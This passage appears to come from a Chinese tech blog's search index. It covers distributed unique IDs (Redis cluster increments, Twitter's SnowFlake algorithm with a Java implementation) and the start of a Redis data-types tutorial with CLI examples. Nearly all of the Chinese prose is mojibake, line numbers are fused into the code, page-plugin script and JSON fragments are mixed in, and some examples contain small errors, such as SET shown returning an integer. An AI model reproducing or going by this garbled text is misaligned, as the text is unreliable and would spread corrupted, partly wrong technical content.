æ¯”è¾ƒé€‚åˆè®¡æ•°åœºæ™¯ï¼Œå¦‚ç”¨æˆ·è®¿é—®é‡ï¼Œè®¢å•æµæ°´å·ï¼ˆæ—¥æœŸ + æµæ°´å·ï¼‰ç­‰ 4.3ã€Redis é›†ç¾¤åœºæ™¯é€šè¿‡ Redis é›†ç¾¤æ¥ç”Ÿæˆå”¯ä¸€ ID æ—¶ï¼Œéœ€è¦è®¾ç½®ç›¸åŒçš„è‡ªå¢æ­¥é•¿ï¼Œä¸”è‡ªå¢æ­¥é•¿ç­‰äºèŠ‚ç‚¹æ•°ï¼ŒåŒæ—¶ Key è¦æ±‚è®¾ç½®ç›¸åŒçš„æœ‰æ•ˆæœŸï¼Œä»¥æ­¤æ¥è·å¾—æ›´é«˜çš„ååé‡ã€‚å‡è®¾ä¸€ä¸ªé›†ç¾¤ä¸­æœ‰ 5 å° Redisï¼Œæ­¤æ—¶å¯ä»¥åˆå§‹åŒ–æ¯å° Redis çš„å€¼åˆ†åˆ«æ˜¯ 1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œç„¶åè‡ªå¢æ­¥é•¿éƒ½æ˜¯ 5ï¼Œé‚£ä¹ˆå„ä¸ª Redis ç”Ÿæˆçš„ ID ä¸ºï¼š Aï¼š1ï¼Œ6ï¼Œ11ï¼Œ16ï¼Œ21 Bï¼š2ï¼Œ7ï¼Œ12ï¼Œ17ï¼Œ22 Cï¼š3ï¼Œ8ï¼Œ13ï¼Œ18ï¼Œ23 Dï¼š4ï¼Œ9ï¼Œ14ï¼Œ19ï¼Œ24 Eï¼š5ï¼Œ10ï¼Œ15ï¼Œ20ï¼Œ25 è¿™ç§æ–¹å¼æœ€å¤§çš„ç¼ºç‚¹æ˜¯å¤æ‚æ€§å¤ªé«˜ï¼Œéœ€è¦ä¸¥é‡ä¾èµ–ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œé›†ç¾¤ç®¡ç†ç¹çï¼Œè€Œä¸”ä»£ç é…ç½®ç¹çã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¶Šæ˜¯å¤æ‚çš„æ–¹æ¡ˆï¼Œè¶Šä¸å¯é ã€‚ 5ã€SnowFlakeï¼ˆé›ªèŠ±ç®—æ³•ï¼‰5.1ã€æ¦‚è¿°SnowFlake ç®—æ³•æ¥æºäº Twitterï¼Œä½¿ç”¨ Scala è¯­è¨€å®ç°ï¼Œåˆ©ç”¨ Thrift æ¡†æ¶å®ç° RPC æ¥å£è°ƒç”¨ï¼Œæœ€åˆçš„é¡¹ç›®èµ·å› æ˜¯æ•°æ®åº“ä» MySQL è¿ç§»åˆ° Cassandraï¼Œè€Œ Cassandra æ²¡æœ‰ç°æˆå¯ç”¨çš„ ID ç”Ÿæˆæœºåˆ¶ï¼Œå°±å‚¬ç”Ÿäº†è¯¥ç®—æ³•ã€‚SnowFlake çš„ç‰¹æ€§å¦‚ä¸‹ï¼š SnowFlake ç”Ÿæˆ ID èƒ½å¤ŸæŒ‰ç…§æ—¶é—´æœ‰åºç”Ÿæˆ ç»æµ‹è¯• SnowFlake æ¯ç§’èƒ½å¤Ÿäº§ç”Ÿ 26 ä¸‡ä¸ªè‡ªå¢å¯æ’åº ID åˆ†å¸ƒå¼ç³»ç»Ÿå†…ä¸ä¼šäº§ç”Ÿ ID ç¢°æ’ï¼ˆç”± datacenter å’Œ workerId åšåŒºåˆ†ï¼‰ï¼Œå¹¶ä¸”ç”Ÿæˆæ•ˆç‡è¾ƒé«˜ SnowFlake ç®—æ³•ç”Ÿæˆ ID çš„ç»“æœæ˜¯ä¸€ä¸ª 64 bit å¤§å°çš„æ•´æ•°ï¼Œåˆšå¥½ä¸ºä¸€ä¸ª Long å‹ï¼Œè½¬æ¢æˆå­—ç¬¦ä¸²åé•¿åº¦æœ€å¤šæ˜¯ 19 5.2ã€ç»“æ„SnowFlake ç®—æ³•çš„ç‰¹æ€§æ˜¯æœ‰åºã€å…¨å±€å”¯ä¸€ã€é«˜æ€§èƒ½ã€ä½å»¶è¿Ÿï¼ˆå“åº”æ—¶é—´åœ¨ 2ms ä»¥å†…ï¼‰ï¼Œå¯åœ¨åˆ†å¸ƒå¼ç¯å¢ƒï¼ˆå¤šé›†ç¾¤ï¼Œè·¨æœºæˆ¿ï¼‰ä¸‹ä½¿ç”¨ï¼Œå› æ­¤ä½¿ç”¨ SnowFlake ç®—æ³•å¾—åˆ°çš„ ID æ˜¯åˆ†æ®µç»„æˆçš„ï¼š ä¸æŒ‡å®šæ—¥æœŸçš„æ—¶é—´å·®ï¼ˆæ¯«ç§’çº§ï¼‰ï¼Œ41 ä½ï¼Œå¤Ÿç”¨ 69 å¹´ é›†ç¾¤ ID + æœºå™¨ IDï¼Œä¸€å…± 10 ä½ï¼ŒåŒ…æ‹¬ 5 ä½ datacenterId å’Œ 5 ä½ workerIdï¼Œæœ€å¤šæ”¯æŒ 1024 å°æœºå™¨ åºåˆ—å·ï¼Œ12 ä½ï¼Œæ¯å°æœºå™¨æ¯æ¯«ç§’å†…æœ€å¤šäº§ç”Ÿ 4096 ä¸ªåºåˆ—å· 1bitï¼šç¬¦å·ä½ï¼Œå›ºå®šæ˜¯ 0ï¼Œè¡¨ç¤ºå…¨éƒ¨ ID éƒ½æ˜¯æ­£æ•´æ•° 41bitï¼šæ—¶é—´æˆ³ï¼ˆæ¯«ç§’æ•°æ—¶é—´å·®ï¼‰ï¼Œä»æŒ‡å®šçš„æ—¥æœŸç®—èµ·ï¼Œå¤Ÿç”¨ 69 å¹´ï¼Œç”¨ Long ç±»å‹è¡¨ç¤ºçš„æ—¶é—´æˆ³æ˜¯ä» 1970-01-01 00:00:00 å¼€å§‹ç®—èµ·çš„ 10bitï¼šæœºå™¨ IDï¼Œæœ‰å¼‚åœ°éƒ¨ç½²ï¼Œå¤šé›†ç¾¤çš„ä¹Ÿå¯ä»¥é…ç½®ï¼Œéœ€è¦çº¿ä¸‹è§„åˆ’å¥½å„åœ°æœºæˆ¿ï¼Œå„é›†ç¾¤ï¼Œå„å®ä¾‹ ID çš„ç¼–å· 12bitï¼šåºåˆ—å·ï¼Œå‰é¢éƒ½ç›¸åŒçš„è¯ï¼Œæœ€å¤šå¯ä»¥æ”¯æŒåˆ° 4096 ä¸ª 5.3ã€ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹æ€§åˆ†é… bit ä½ï¼Œéå¸¸çµæ´» æ¯«ç§’æ•°åœ¨é«˜ä½ï¼Œè‡ªå¢åºåˆ—åœ¨ä½ä½ï¼Œæ•´ä¸ª ID éƒ½æ˜¯è¶‹åŠ¿é€’å¢çš„ ä¸ä¾èµ–æ•°æ®åº“ç­‰ä¸‰æ–¹ç³»ç»Ÿï¼Œä»¥æœåŠ¡çš„æ–¹å¼éƒ¨ç½²ï¼Œç¨³å®šæ€§æ›´é«˜ï¼Œç”Ÿæˆ ID çš„æ•ˆç‡ä¹Ÿæ˜¯éå¸¸é«˜ï¼Œä½å»¶è¿Ÿ ç¼ºç‚¹ï¼š å¼ºä¾èµ–æœºå™¨æ—¶é’Ÿï¼Œå¦‚æœæœºå™¨çš„æ—¶é’Ÿå›æ‹¨äº†ï¼Œä¼šå¯¼è‡´ç”Ÿæˆé‡å¤çš„ ID è‹¥ç”Ÿæˆç¯å¢ƒä¸­ä½¿ç”¨äº†å®¹å™¨åŒ–æŠ€æœ¯ï¼Œå®ä¾‹çš„ä¸ªæ•°éšæ—¶æœ‰å˜åŒ–ï¼Œé‚£ä¹ˆ SnowFlake éœ€è¦ä¸€å®šçš„æ”¹é€ æ‰èƒ½æ›´å¥½åœ°åº”ç”¨åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ åœ¨å•æœºä¸Šæ˜¯é€’å¢çš„ï¼Œä½†æ˜¯ç”±äºæ¶‰åŠåˆ°åˆ†å¸ƒå¼ç¯å¢ƒï¼Œæ¯å°æœºå™¨ä¸Šçš„æ—¶é’Ÿä¸å¯èƒ½å®Œå…¨åŒæ­¥ï¼ˆå¦‚æ—¶é’Ÿå›æ‹¨ï¼‰ï¼Œæœ‰æ—¶å€™å¯èƒ½ä¼šå‡ºç°ä¸æ˜¯å…¨å±€é€’å¢çš„æƒ…å†µï¼ˆæ­¤ç¼ºç‚¹å¯è®¤ä¸ºæ— æ‰€è°“ï¼Œä¸€èˆ¬åˆ†å¸ƒå¼ ID åªæ˜¯è¦æ±‚è¶‹åŠ¿é€’å¢ï¼Œå¹¶ä¸ä¼šä¸¥æ ¼è¦æ±‚é€’å¢ï¼Œ90% çš„ä¸šåŠ¡éœ€æ±‚éƒ½åªéœ€è¦è¶‹åŠ¿é€’å¢ï¼‰ é€‚ç”¨åœºæ™¯ï¼š åˆ†å¸ƒå¼åº”ç”¨ç¯å¢ƒçš„æ•°æ®ä¸»é”® 5.4ã€Java ç‰ˆå®ç°Java ç‰ˆçš„ä»£ç å®ç°æ¥è‡ªè¿™é‡Œï¼Œåœ¨ä¼ä¸šçš„é¡¹ç›®å¼€å‘ä¸­ï¼Œä¸€èˆ¬å¯ä»¥ç›´æ¥ä½¿ç”¨å°è£…å¥½ SnowFlake ç®—æ³•çš„ Java å·¥å…·åº“ï¼ˆå¦‚ Hutools å·¥å…·åº“ï¼‰ï¼Œä¸å†éœ€è¦è‡ªå·±å®ç°ä¸€éï¼Œå®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/** * twitterçš„snowflakeç®—æ³• -- javaå®ç° * * @author beyond * @date 2016/11/26 */public class SnowFlake { /** * èµ·å§‹çš„æ—¶é—´æˆ³ */ private final static long START_STMP = 1480166465631L; /** * æ¯ä¸€éƒ¨åˆ†å ç”¨çš„ä½æ•° */ private final static long SEQUENCE_BIT = 12; //åºåˆ—å·å ç”¨çš„ä½æ•° private final static long MACHINE_BIT = 5; //æœºå™¨æ ‡è¯†å ç”¨çš„ä½æ•° private final static long DATACENTER_BIT = 5;//æ•°æ®ä¸­å¿ƒå ç”¨çš„ä½æ•° /** * æ¯ä¸€éƒ¨åˆ†çš„æœ€å¤§å€¼ */ private final static long MAX_DATACENTER_NUM = -1L ^ (-1L &lt;&lt; DATACENTER_BIT); private final static long MAX_MACHINE_NUM = -1L ^ (-1L &lt;&lt; MACHINE_BIT); private final static long MAX_SEQUENCE = -1L ^ (-1L &lt;&lt; SEQUENCE_BIT); /** * æ¯ä¸€éƒ¨åˆ†å‘å·¦çš„ä½ç§» */ private final static long MACHINE_LEFT = SEQUENCE_BIT; private final static long DATACENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; private final static long TIMESTMP_LEFT = DATACENTER_LEFT + DATACENTER_BIT; private long datacenterId; //æ•°æ®ä¸­å¿ƒ private long machineId; //æœºå™¨æ ‡è¯† private long sequence = 0L; //åºåˆ—å· private long lastStmp = -1L;//ä¸Šä¸€æ¬¡æ—¶é—´æˆ³ public SnowFlake(long datacenterId, long machineId) { if (datacenterId &gt; MAX_DATACENTER_NUM || datacenterId &lt; 0) { throw new IllegalArgumentException("datacenterId can\'t be greater than MAX_DATACENTER_NUM or less than 0"); } if (machineId &gt; MAX_MACHINE_NUM || machineId &lt; 0) { throw new IllegalArgumentException("machineId can\'t be greater than MAX_MACHINE_NUM or less than 0"); } this.datacenterId = datacenterId; this.machineId = machineId; } /** * äº§ç”Ÿä¸‹ä¸€ä¸ªID * * @return */ public synchronized long nextId() { long currStmp = getNewstmp(); if (currStmp &lt; lastStmp) { throw new RuntimeException("Clock moved backwards. Refusing to generate id"); } if (currStmp == lastStmp) { //ç›¸åŒæ¯«ç§’å†…ï¼Œåºåˆ—å·è‡ªå¢ sequence = (sequence + 1) &amp; MAX_SEQUENCE; //åŒä¸€æ¯«ç§’çš„åºåˆ—æ•°å·²ç»è¾¾åˆ°æœ€å¤§ if (sequence == 0L) { currStmp = getNextMill(); } } else { //ä¸åŒæ¯«ç§’å†…ï¼Œåºåˆ—å·ç½®ä¸º0 sequence = 0L; } lastStmp = currStmp; return (currStmp - START_STMP) &lt;&lt; TIMESTMP_LEFT //æ—¶é—´æˆ³éƒ¨åˆ† | datacenterId &lt;&lt; DATACENTER_LEFT //æ•°æ®ä¸­å¿ƒéƒ¨åˆ† | machineId &lt;&lt; MACHINE_LEFT //æœºå™¨æ ‡è¯†éƒ¨åˆ† | sequence; //åºåˆ—å·éƒ¨åˆ† } private long getNextMill() { long mill = getNewstmp(); while (mill &lt;= lastStmp) { mill = getNewstmp(); } return mill; } private long getNewstmp() { return System.currentTimeMillis(); } public static void main(String[] args) { SnowFlake snowFlake = new SnowFlake(2, 3); for (int i = 0; i &lt; (1 &lt;&lt; 12); i++) { System.out.println(snowFlake.nextId()); } }} ä¸Šé¢çš„ä»£ç åŸºæœ¬ä¸Šé€šè¿‡ä½ç§»æ“ä½œï¼Œå°†æ¯æ®µå«ä¹‰çš„æ•°å€¼ï¼Œç§»åˆ°ç›¸åº”çš„ä½ç½®ä¸Šã€‚å¦‚æœºå™¨ ID è¿™é‡Œç”±æ•°æ®ä¸­å¿ƒ + æœºå™¨æ ‡è¯†ç»„æˆï¼Œæ‰€ä»¥ï¼Œæœºå™¨æ ‡è¯†å‘å·¦ç§» 12 ä½ï¼Œå°±æ˜¯å®ƒçš„ä½ç½®ï¼Œæ•°æ®ä¸­å¿ƒçš„ç¼–å·å‘å·¦ç§» 17 ä½ï¼Œæ—¶é—´æˆ³çš„å€¼å‘å·¦ç§» 22 ä½ï¼Œæ¯éƒ¨åˆ†å æ®è‡ªå·±çš„ä½ç½®ï¼Œå„ä¸å¹²æ¶‰ï¼Œç”±æ­¤ç»„æˆä¸€ä¸ªå®Œæ•´çš„ ID å€¼ã€‚ äº†è§£ SnowFlake çš„åŸºæœ¬å®ç°åŸç†ï¼Œå¯ä»¥é€šè¿‡æå‰è§„åˆ’å¥½æœºå™¨æ ‡è¯†æ¥å®ç°ï¼Œä½†ç›®å‰çš„åˆ†å¸ƒå¼ç”Ÿäº§ç¯å¢ƒï¼Œå€Ÿç”¨äº†å¤šç§äº‘è®¡ç®—ã€å®¹å™¨åŒ–æŠ€æœ¯ï¼Œå®ä¾‹çš„ä¸ªæ•°éšæ—¶æœ‰å˜åŒ–ï¼Œè€Œä¸”è¿˜éœ€è¦å¤„ç†æœåŠ¡å™¨å®ä¾‹çš„æ—¶é’Ÿå›æ‹¨é—®é¢˜ï¼Œå›ºå®šè§„åˆ’ ID ç„¶åé€šè¿‡é…ç½®æ¥ä½¿ç”¨ SnowFlake çš„åœºæ™¯å¯è¡Œæ€§ä¸é«˜ã€‚ä¸€èˆ¬æ˜¯è‡ªåŠ¨å¯åœï¼Œå¢å‡æœºå™¨ï¼Œè¿™æ ·å°±éœ€è¦å¯¹ SnowFlake è¿›è¡Œä¸€äº›æ”¹é€ æ‰èƒ½æ›´å¥½åœ°åº”ç”¨åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ã€‚ ä¸‹ç¯‡ - åˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID è§£å†³æ–¹æ¡ˆä¹‹äºŒ åˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID è§£å†³æ–¹æ¡ˆä¹‹äºŒ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼ æ•°æ®åº“"},{title:"Redis å…¥é—¨æ•™ç¨‹ä¹‹ä¸€äº”å¤§æ•°æ®ç±»å‹",url:"/posts/fea85f3.html",text:'ç³»ç»Ÿçº§å‘½ä»¤è·å–ç¬¦åˆè§„åˆ™çš„é”®ååˆ—è¡¨KEYS å‘½ä»¤éœ€è¦éå† Redis ä¸­çš„æ‰€æœ‰é”®ï¼Œå½“é”®çš„æ•°é‡è¾ƒå¤šæ—¶ä¼šä¸¥é‡å½±å“æ€§èƒ½ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­åº”è¯¥ç¦ç”¨è¯¥å‘½ä»¤ã€‚ 1KEYS pattern ç¤ºä¾‹ï¼š 12redis&gt; KEYS *1) "book" pattern æ”¯æŒ Glob é£æ ¼çš„é€šé…ç¬¦æ ¼å¼ï¼š ç¬¦å· å«ä¹‰ ? åŒ¹é…ä¸€ä¸ªå­—ç¬¦ * åŒ¹é…ä»»æ„ä¸ªï¼ˆåŒ…æ‹¬ 0 ä¸ªï¼‰å­—ç¬¦ [ ] åŒ¹é…æ‹¬å·é—´çš„ä»»ä¸€å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨ â€œ-â€ ç¬¦å·æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œå¦‚ a [b-d] å¯ä»¥åŒ¹é… â€œabâ€ã€â€acâ€ã€â€adâ€ \\x åŒ¹é…å­—ç¬¦ xï¼Œç”¨äºè½¬ä¹‰å­—ç¬¦ï¼Œå¦‚éœ€è¦åŒ¹é… â€œ?â€ å°±éœ€è¦ä½¿ç”¨ \\? åˆ¤æ–­ä¸€ä¸ªé”®æ˜¯å¦å­˜åœ¨å¦‚æœé”®å­˜åœ¨åˆ™è¿”å›æ•´æ•°ç±»å‹ 1ï¼Œå¦åˆ™è¿”å› 0ã€‚ 1EXISTS key ç¤ºä¾‹ï¼š 12345redis&gt; EXISTS book(integer) 1redis&gt; EXISTS noexists(integer) 0 åˆ é™¤é”®å¯ä»¥åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œè¿”å›å€¼æ˜¯åˆ é™¤çš„é”®çš„ä¸ªæ•°ã€‚ 1DEL key ç¤ºä¾‹ï¼š 12345redis&gt; DEL book(integer) 1redis&gt; DEL noexists(integer) 0 DEL å‘½ä»¤çš„å‚æ•°ä¸æ”¯æŒé€šé…ç¬¦ï¼Œä½†å¯ä»¥ç»“åˆ Linux çš„ç®¡é“å’Œ xargs å‘½ä»¤å®ç°åˆ é™¤æ‰€æœ‰ç¬¦åˆè§„åˆ™çš„é”®ã€‚æ¯”å¦‚è¦åˆ é™¤ä»¥ â€œuser:â€ å¼€å¤´çš„é”®ï¼Œå°±å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1$ redis-cli KEYS "user:*" | xargs redis-cli DEL å¦å¤–ç”±äº DEL å‘½ä»¤æ”¯æŒå¤šä¸ªé”®ä½œä¸ºå‚æ•°ï¼Œæ‰€ä»¥è¿˜å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼Œä½†æ˜¯æ€§èƒ½æ›´å¥½ï¼š 1$ redis-cli DEL `redis-cli KEYS "user:*"` è·å¾—é”®å€¼çš„æ•°æ®ç±»å‹1TYPE key ç¤ºä¾‹ï¼š 12127.0.0.1:6379&gt; type bookstring æ¸…ç©ºå½“å‰æ•°æ®åº“1FLUSHDB [ASYNC] æ¸…ç©ºæ‰€æœ‰æ•°æ®åº“1FLUSHALL [ASYNC] è®¾ç½®è¿‡æœŸæ—¶é—´1EXPIRE key seconds æŸ¥çœ‹å‰©ä½™å­˜æ´»æ—¶é—´1TTL key æ•°æ®ç±»å‹å­—ç¬¦ä¸²ç±»å‹ï¼ˆStringï¼‰å­—ç¬¦ä¸²ç±»å‹æ˜¯ Redis ä¸­æœ€åŸºç¡€çš„æ•°æ®ç±»å‹ï¼Œå®ƒèƒ½å­˜å‚¨ä»»ä½•å½¢å¼çš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬äºŒè¿›åˆ¶æ•°æ®ã€‚ä¾‹å¦‚å­˜å‚¨ç”¨æˆ·çš„é‚®ç®±ã€JSON åŒ–çš„å¯¹è±¡ç”šè‡³æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹é”®å…è®¸å­˜å‚¨çš„æœ€å¤§å®¹é‡æ˜¯ 512 MBã€‚å­—ç¬¦ä¸²ç±»å‹æ˜¯å…¶ä»– 4 ç§æ•°æ®ç±»å‹çš„åŸºç¡€ï¼Œå…¶ä»–æ•°æ®ç±»å‹å’Œå­—ç¬¦ä¸²ç±»å‹çš„å·®åˆ«ä»æŸç§è§’åº¦æ¥è¯´åªæ˜¯ç»„ç»‡å­—ç¬¦ä¸²çš„å½¢å¼ä¸åŒã€‚ä¾‹å¦‚ï¼Œåˆ—è¡¨ç±»å‹ï¼ˆListï¼‰æ˜¯ä»¥åˆ—è¡¨çš„å½¢å¼ç»„ç»‡å­—ç¬¦ä¸²ï¼Œè€Œé›†åˆç±»å‹æ˜¯ä»¥é›†åˆçš„å½¢å¼ç»„ç»‡å­—ç¬¦ä¸²ã€‚ èµ‹å€¼ä¸å–å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰123SET key valueGET key ç¤ºä¾‹ï¼š 12345redis&gt; SET book javaOKredis&gt; GET book"java" å–å€¼æ—¶ï¼Œå½“é”®ä¸å­˜åœ¨æ—¶ï¼Œä¼šè¿”å›ç©ºç»“æœã€‚ é€’å¢æ•°å­—å­—ç¬¦ä¸²ç±»å‹å¯ä»¥å­˜å‚¨ä»»ä½•å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œå½“å­˜å‚¨çš„å­—ç¬¦ä¸²æ˜¯æ•´æ•°å½¢å¼æ—¶ï¼ŒRedis æä¾›äº†ä¸€ä¸ªå®ç”¨çš„å‘½ä»¤ INCRï¼Œå…¶ä½œç”¨æ˜¯è®©å½“å‰é”®å€¼é€’å¢ 1ï¼Œå¹¶è¿”å›é€’å¢åçš„å€¼ã€‚ 1INCR key ç¤ºä¾‹ï¼š 12345redis&gt; INCR num(integer) 1redis&gt; INCR num(integer) 2 å½“è¦æ“ä½œçš„é”®ä¸å­˜åœ¨æ—¶ï¼Œä¼šåˆ›å»ºè¯¥é”®å¹¶è®¾ç½®å€¼ä¸º 0ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡é€’å¢åçš„ç»“æœä¸º 1ã€‚ 1234redis&gt; SET foo barredis&gt; INCR foo(error) ERR value is not an integer or out of range å½“é”®å€¼ä¸æ˜¯æ•´æ•°æ—¶ï¼ŒRedis ä¼šæç¤ºé”™è¯¯ã€‚ å¢åŠ æŒ‡å®šçš„æ•´æ•°INCRBY å‘½ä»¤ä¸ INCR å‘½ä»¤çº§åˆ«ä¸€æ ·ï¼Œåªä¸è¿‡å‰è€…å¯ä»¥é€šè¿‡ increment å‚æ•°æŒ‡å®šä¸€æ¬¡å¢åŠ çš„æ•°å€¼ã€‚ 1INCRBY key increment ç¤ºä¾‹ï¼š 12345redis&gt; INCRBY bar 2(integer) 2redis&gt; INCRBY bar 3(integer) 5 å‡å°‘æŒ‡å®šçš„æ•´æ•°DECR å‘½ä»¤ä¸ INCR å‘½ä»¤çš„ç”¨æ³•ç›¸åŒï¼Œåªä¸è¿‡æ˜¯è®©é”®å€¼é€’å‡ 1ã€‚ 1DECR key ç¤ºä¾‹ï¼š 12redis&gt; DECR car(integer) -1 DECRBY ä¸ INCRBY å‘½ä»¤çš„ç”¨æ³•ç›¸åŒï¼Œå¯ä»¥é€šè¿‡ increment å‚æ•°æŒ‡å®šä¸€æ¬¡é€’å‡çš„æ•°å€¼ã€‚ 1DECRBY key increment ç¤ºä¾‹ï¼š 12345redis&gt; DECRBY cat 3(integer) -3redis&gt; DECRBY cat 5(integer) -8 å¢åŠ æŒ‡å®šçš„æµ®ç‚¹æ•°INCRBYFLOAT å‘½ä»¤ç±»ä¼¼ INCRBY å‘½ä»¤ï¼Œå·®åˆ«æ˜¯ INCRBYFLOAT å¯ä»¥é€’å¢ä¸€ä¸ªåŒç²¾åº¦æµ®ç‚¹æ•°ã€‚ 1INCRBYFLOAT key pattern ç¤ºä¾‹ï¼š 12345redis&gt; INCRBYFLOAT bar 2.7"2.7"redis&gt; INCRBYFLOAT bar 5E+4"50002.69999999999999929" å‘å°¾éƒ¨è¿½åŠ å€¼APPEND çš„ä½œç”¨æ˜¯å‘é”®å€¼çš„æœ«å°¾è¿½åŠ  valueã€‚å¦‚æœé”®ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºè¯¥é”®å¹¶è®¾ç½®å€¼ä¸º valueï¼Œè¿”å›å€¼æ˜¯è¿½åŠ åå­—ç¬¦ä¸²çš„æ€»é•¿åº¦ã€‚ 1APPEND key value ç¤ºä¾‹ï¼š 12345678redis&gt; set key helloOKredis&gt; APPEND key " world!"(integer) 12redis&gt; GET key"hello world!" è·å–å­—ç¬¦ä¸²é•¿åº¦STRLEN å‘½ä»¤è¿”å›é”®å€¼çš„é•¿åº¦ï¼Œå¦‚æœé”®ä¸å­˜åœ¨åˆ™è¿”å› 0ã€‚ 1STRLEN key ç¤ºä¾‹ï¼š 12345678redis&gt; STRLEN key(integer) 12redis&gt; set key ä½ å¥½OKredis&gt; STRLEN key(integer) 6 åŒæ—¶è·å– / è®¾ç½®å¤šä¸ªé”®å€¼123MGET key [key ...]MSET key value [key value ...] ç¤ºä¾‹ï¼š 123456redis&gt; MSET key1 v1 key2 v2 key3 v3redis&gt; MGET key1 key2 key31) "v1"2) "v2"3) "v3" ä½æ“ä½œä½æ“ä½œå‘½ä»¤ï¼š 123456789GETBIT key offsetSETBIT key offset valueBITCOUNT key [start] [end]BITOP operation destkey key [key ...]BITPOS key value [start] [end] ä¸€ä¸ªå­—èŠ‚ç”± 8 ä¸ªäºŒè¿›åˆ¶ä½ç»„æˆï¼ŒRedis æä¾›äº†ä¸Šè¿° 4 ä¸ªå‘½ä»¤å¯ä»¥ç›´æ¥å¯¹äºŒè¿›åˆ¶ä½è¿›è¡Œæ“ä½œã€‚ä¸ºäº†æ¼”ç¤ºï¼Œé¦–å…ˆå°† foo é”®èµ‹å€¼ä¸º barï¼š 12redis&gt; SET foo bar(integer) 0 bar çš„ 3 ä¸ªå­—æ¯ â€œbâ€ã€â€aâ€ã€â€râ€ å¯¹åº”çš„ ASCII ç åˆ†åˆ«æ˜¯ 98ã€97 å’Œ 114ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶ååˆ†åˆ«ä¸º 1100010ã€1100001ã€1110010ï¼Œæ‰€ä»¥ foo é”®ä¸­çš„äºŒè¿›åˆ¶ä½ç»“æ„å›¾å¦‚ä¸‹ï¼š GETBIT å‘½ä»¤å¯ä»¥è·å–ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹é”®æŒ‡å®šä½ç½®çš„äºŒè¿›åˆ¶ä½çš„å€¼ï¼ˆ0 æˆ– 1ï¼‰ï¼Œç´¢å¼•ä» 0 å¼€å§‹ã€‚å¦‚æœéœ€è¦è·å–çš„äºŒè¿›åˆ¶ä½çš„ç´¢å¼•è¶…å‡ºäº†é”®å€¼çš„äºŒè¿›åˆ¶ä½çš„å®é™…é•¿åº¦ï¼Œåˆ™é»˜è®¤å€¼ä¸º 0ã€‚ 12345678redis&gt; GETBIT foo 0(integer) 0redis&gt; GETBIT foo 6(integer) 1redis&gt; GETBIT foo 100000(integer) 0 SETBIT å‘½ä»¤å¯ä»¥è®¾ç½®å­—ç¬¦ä¸²ç±»å‹é”®æŒ‡å®šä½ç½®çš„äºŒè¿›åˆ¶ä½çš„å€¼ï¼Œè¿”å›å€¼æ˜¯è¯¥ä½ç½®çš„æ—§å€¼ã€‚å¦‚æœè¦å°† foo é”®å€¼è®¾ç½®ä¸º aarï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä½æ“ä½œå°† foo é”®çš„äºŒè¿›åˆ¶ä½çš„ç´¢å¼•ç¬¬ 6 ä½è®¾ç½®ä¸º 0ï¼Œç¬¬ 7 ä½è®¾ç½®ä¸º 1ã€‚ 12345678redis&gt; SETBIT foo 6 0(integer) 1redis&gt; SETBIT foo 7 1(integer) 0redis&gt; GET foo"aar" å¦‚æœè¦è®¾ç½®çš„ä½ç½®è¶…è¿‡äº†é”®å€¼çš„äºŒè¿›åˆ¶çš„é•¿åº¦ï¼ŒSETBIT å‘½ä»¤ä¼šè‡ªåŠ¨å°†ä¸­é—´çš„äºŒè¿›åˆ¶ä½è®¾ç½®ä¸º 0ï¼›åŒç†è®¾ç½®ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„æŒ‡å®šäºŒè¿›åˆ¶ä½çš„å€¼ï¼Œä¼šè‡ªåŠ¨å°†å‰é¢çš„ä½èµ‹å€¼ä¸º 0ã€‚ 12345redis&gt; SETBIT nofoo 10 1(integer) 0redis&gt; GETBIT nofoo 5(integer) 0 BITCOUNT å‘½ä»¤å¯ä»¥è·å¾—å­—ç¬¦ä¸²ç±»å‹é”®ä¸­å€¼æ˜¯ 1 çš„äºŒè¿›åˆ¶ä½ä¸ªæ•°ï¼Œä¾‹å¦‚ï¼š 12345redis&gt; set foo barOKredis&gt; BITCOUNT foo(integer) 10 BITCOUNT 